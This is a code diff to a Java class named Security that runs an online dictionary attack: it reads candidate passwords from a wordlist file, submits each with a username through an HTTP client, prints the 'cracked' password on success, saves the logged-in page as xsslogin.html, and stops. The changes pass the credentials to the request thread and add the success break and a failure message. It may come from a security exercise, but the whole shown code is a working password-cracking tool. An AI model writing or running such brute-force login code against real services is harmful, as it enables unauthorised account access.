@@ -36,13 +36,14 @@ public class Security {
         BufferedReader br = new BufferedReader(new FileReader(dic_file));
         String password = null;
         while ((password = br.readLine()) != null) {
-            Httpthread threads = new Httpthread();
+            Httpthread threads = new Httpthread(username,password);
             try {
                 //threads.get_request();
                 threads.httpclient();
                 if (threads.get_success() == 1) {
                     final_success = 1;
                     System.out.println("Log In Successful");
+                    System.out.println("Cracked password is: "+password);
                     String page = threads.get_entity();
                     File newpage = new File("xsslogin.html");
                     FileWriter wr = new FileWriter(newpage);
@@ -55,7 +56,12 @@ public class Security {
             } catch (IOException ex) {
                 Logger.getLogger(Security.class.getName()).log(Level.SEVERE, null, ex);
             }
+            if(final_success==1)
+                break;
         }
+        if(final_success==0)
+            System.out.println("Could not crack the password");
+            br.close();
     }
 
 }
